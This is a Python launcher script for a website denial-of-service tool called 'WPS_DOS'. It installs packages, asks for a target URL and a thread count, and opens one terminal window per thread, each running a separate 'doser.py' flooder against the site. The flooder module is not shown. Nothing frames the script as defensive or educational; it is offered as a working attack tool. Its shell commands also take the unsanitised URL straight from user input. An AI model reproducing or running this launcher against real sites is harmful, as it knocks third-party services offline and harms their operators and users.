import os

def right_url(url):
	length = len(url)
	if url[length-1] == "/":
		file = open("bin/list.txt", "r")
		line = file.readline().strip()
		url = url + line
		file.close
		return url
	else:
                file = open("bin/list.txt", "r")
                line = file.readline().strip()
                url = url + "/" +  line
                file.close
                return url

def threads(count):
	i = 0
	while i < count:
		os.system("gnome-terminal -- python bin/doser.py -t 999 -g '" + url + "'")
		i += 1

def bunner(text):
	os.system("clear")
	os.system("toilet -f ivrit '" + text + "' -F gay | boxes -d cat -a hc -p h8")

os.system("apt install toilet boxes python python3 -y && clear")
bunner("WPS_DOS")
url = input("\nEnter site's url [http\https]://example.[com]/ -----> ")
url = str(url)
url = right_url(url)
thr = input("How many threads use? (!1 THREAD = 1 TERMINAL WINDOW) ----->")
bunner("DOS STARTED")
print("\nTo stop close a new terminal windows")
thr = int(thr)
if thr == 0:
	threads(1)
elif thr < 0:
	threads(1)
else:
	threads(thr)
